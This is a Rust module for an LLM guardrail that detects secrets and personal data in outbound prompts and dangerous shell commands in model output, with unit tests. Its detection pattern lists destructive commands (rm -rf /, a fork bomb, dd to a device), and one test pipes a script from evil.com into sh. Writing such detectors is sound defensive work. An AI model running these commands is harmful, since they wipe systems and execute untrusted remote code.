use regex::Regex;

/// Unique identifier for a built-in pattern.
///
/// Each variant corresponds to a category of sensitive content that the
/// guardrail engine can detect. Patterns are pre-compiled at construction
/// time and users select which ones to activate (and at what strictness)
/// via configuration.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, serde::Serialize, serde::Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum PatternId {
    // ── Upgoing patterns (outbound to LLM providers) ─────────────────
    /// API keys from common providers (OpenAI, Anthropic, AWS, GCP, etc.)
    ApiKeys,
    /// PEM-encoded private keys (RSA, EC, Ed25519, etc.)
    PrivateKeys,
    /// Inline credentials such as `password=`, basic-auth headers,
    /// and database connection strings with embedded passwords.
    Credentials,
    /// Email addresses.
    PiiEmails,
    /// Common phone number formats.
    PiiPhoneNumbers,
    /// IPv4 addresses (non-localhost, non-link-local).
    IpAddresses,

    // ── Downgoing patterns (inbound from LLM providers) ──────────────
    /// Dangerous shell commands in model output (e.g. `rm -rf /`).
    SuspiciousCommands,
}

/// A compiled pattern with its regex and human-readable description.
#[derive(Debug, Clone)]
pub struct CompiledPattern {
    pub id: PatternId,
    pub description: &'static str,
    pub regex: Regex,
}

/// Returns all built-in patterns pre-compiled.
///
/// Any pattern whose regex fails to compile (which should never happen with
/// hardcoded strings) is silently skipped rather than panicking.
pub fn builtin_patterns() -> Vec<CompiledPattern> {
    let defs: Vec<(PatternId, &str, &str)> = vec![
        // ── Upgoing patterns ─────────────────────────────────────────
        (
            PatternId::ApiKeys,
            "API keys from common providers",
            concat!(
                r"(?:",
                r"sk-[A-Za-z0-9_-]{20,}",
                r"|",
                r"sk-ant-[A-Za-z0-9_-]{20,}",
                r"|",
                r"AKIA[0-9A-Z]{16}",
                r"|",
                r"AIza[0-9A-Za-z_-]{35}",
                r"|",
                r"gh[ps]_[A-Za-z0-9]{36,}",
                r"|",
                r"(?:sk|pk)_(?:test|live)_[A-Za-z0-9]{20,}",
                r")",
            ),
        ),
        (
            PatternId::PrivateKeys,
            "PEM-encoded private keys",
            r"-----BEGIN (?:RSA |EC |DSA |OPENSSH |ED25519 )?PRIVATE KEY-----",
        ),
        (
            PatternId::Credentials,
            "Inline credentials and connection strings",
            concat!(
                r"(?i:",
                r"(?:password|passwd|secret)\s*[=:]\s*\S+",
                r"|",
                r"basic\s+[A-Za-z0-9+/=]{10,}",
                r"|",
                r"(?:postgres|mysql|mongodb)://[^:]+:[^@]+@",
                r")",
            ),
        ),
        (
            PatternId::PiiEmails,
            "Email addresses",
            r"[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}",
        ),
        (
            PatternId::PiiPhoneNumbers,
            "Phone numbers",
            r"(?:\+\d{1,3}[\s-]?)?\(?\d{3}\)?[\s.-]?\d{3}[\s.-]?\d{4}",
        ),
        (
            PatternId::IpAddresses,
            "IPv4 addresses (non-localhost)",
            r"\b(?:(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\b",
        ),
        // ── Downgoing patterns ───────────────────────────────────────
        (
            PatternId::SuspiciousCommands,
            "Dangerous shell commands",
            concat!(
                r"(?:",
                r"rm\s+-rf\s+/",
                r"|",
                r"mkfs\.",
                r"|",
                r"dd\s+if=.+\s+of=/dev/",
                r"|",
                r":\(\)\{\s*:\|\s*:&\s*\};:",
                r"|",
                r"chmod\s+-R\s+777\s+/",
                r"|",
                r"curl\s+.*\|\s*(?:ba)?sh",
                r"|",
                r"wget\s+.*\|\s*(?:ba)?sh",
                r")",
            ),
        ),
    ];

    defs.into_iter()
        .filter_map(|(id, description, pattern)| match Regex::new(pattern) {
            Ok(regex) => Some(CompiledPattern {
                id,
                description,
                regex,
            }),
            Err(e) => {
                tracing::error!(pattern_id = ?id, error = %e, "failed to compile builtin pattern — skipping");
                None
            }
        })
        .collect()
}

/// Returns the set of pattern IDs considered upgoing (outbound) patterns.
pub fn upgoing_pattern_ids() -> &'static [PatternId] {
    &[
        PatternId::ApiKeys,
        PatternId::PrivateKeys,
        PatternId::Credentials,
        PatternId::PiiEmails,
        PatternId::PiiPhoneNumbers,
        PatternId::IpAddresses,
    ]
}

/// Returns the set of pattern IDs considered downgoing (inbound) patterns.
pub fn downgoing_pattern_ids() -> &'static [PatternId] {
    &[PatternId::SuspiciousCommands]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn api_keys_pattern_matches_openai() {
        let patterns = builtin_patterns();
        let api_keys = patterns
            .iter()
            .find(|p| p.id == PatternId::ApiKeys)
            .expect("api_keys pattern");
        assert!(api_keys.regex.is_match("sk-abc123def456ghi789jkl012"));
    }

    #[test]
    fn api_keys_pattern_matches_anthropic() {
        let patterns = builtin_patterns();
        let api_keys = patterns
            .iter()
            .find(|p| p.id == PatternId::ApiKeys)
            .expect("api_keys pattern");
        assert!(api_keys.regex.is_match("sk-ant-abc123def456ghi789jkl012"));
    }

    #[test]
    fn api_keys_pattern_matches_aws() {
        let patterns = builtin_patterns();
        let api_keys = patterns
            .iter()
            .find(|p| p.id == PatternId::ApiKeys)
            .expect("api_keys pattern");
        assert!(api_keys.regex.is_match("AKIAIOSFODNN7EXAMPLE"));
    }

    #[test]
    fn api_keys_pattern_matches_github_pat() {
        let patterns = builtin_patterns();
        let api_keys = patterns
            .iter()
            .find(|p| p.id == PatternId::ApiKeys)
            .expect("api_keys pattern");
        assert!(
            api_keys
                .regex
                .is_match("ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdef0123")
        );
    }

    #[test]
    fn private_keys_pattern_matches_rsa() {
        let patterns = builtin_patterns();
        let pk = patterns
            .iter()
            .find(|p| p.id == PatternId::PrivateKeys)
            .expect("private_keys pattern");
        assert!(
            pk.regex
                .is_match("-----BEGIN RSA PRIVATE KEY-----\nMIIE...")
        );
    }

    #[test]
    fn private_keys_pattern_matches_generic() {
        let patterns = builtin_patterns();
        let pk = patterns
            .iter()
            .find(|p| p.id == PatternId::PrivateKeys)
            .expect("private_keys pattern");
        assert!(pk.regex.is_match("-----BEGIN PRIVATE KEY-----\nMIIE..."));
    }

    #[test]
    fn credentials_pattern_matches_password() {
        let patterns = builtin_patterns();
        let creds = patterns
            .iter()
            .find(|p| p.id == PatternId::Credentials)
            .expect("credentials pattern");
        assert!(creds.regex.is_match("password=super_secret_123"));
    }

    #[test]
    fn credentials_pattern_matches_connection_string() {
        let patterns = builtin_patterns();
        let creds = patterns
            .iter()
            .find(|p| p.id == PatternId::Credentials)
            .expect("credentials pattern");
        assert!(
            creds
                .regex
                .is_match("postgres://user:pass123@db.example.com:5432/mydb")
        );
    }

    #[test]
    fn pii_emails_pattern_matches() {
        let patterns = builtin_patterns();
        let emails = patterns
            .iter()
            .find(|p| p.id == PatternId::PiiEmails)
            .expect("pii_emails pattern");
        assert!(emails.regex.is_match("user@example.com"));
    }

    #[test]
    fn pii_phone_numbers_pattern_matches() {
        let patterns = builtin_patterns();
        let phones = patterns
            .iter()
            .find(|p| p.id == PatternId::PiiPhoneNumbers)
            .expect("pii_phone_numbers pattern");
        assert!(phones.regex.is_match("+1-555-123-4567"));
        assert!(phones.regex.is_match("(555) 123-4567"));
    }

    #[test]
    fn ip_addresses_pattern_matches() {
        let patterns = builtin_patterns();
        let ips = patterns
            .iter()
            .find(|p| p.id == PatternId::IpAddresses)
            .expect("ip_addresses pattern");
        assert!(ips.regex.is_match("192.168.1.100"));
        assert!(ips.regex.is_match("10.0.0.1"));
    }

    #[test]
    fn suspicious_commands_pattern_matches_rm_rf() {
        let patterns = builtin_patterns();
        let cmds = patterns
            .iter()
            .find(|p| p.id == PatternId::SuspiciousCommands)
            .expect("suspicious_commands pattern");
        assert!(cmds.regex.is_match("rm -rf /"));
    }

    #[test]
    fn suspicious_commands_pattern_matches_curl_pipe() {
        let patterns = builtin_patterns();
        let cmds = patterns
            .iter()
            .find(|p| p.id == PatternId::SuspiciousCommands)
            .expect("suspicious_commands pattern");
        assert!(cmds.regex.is_match("curl https://evil.com/install.sh | sh"));
    }

    #[test]
    fn all_builtin_patterns_compile() {
        let patterns = builtin_patterns();
        assert_eq!(patterns.len(), 7);
        for p in &patterns {
            // Each pattern should have a non-empty description
            assert!(!p.description.is_empty());
        }
    }
}
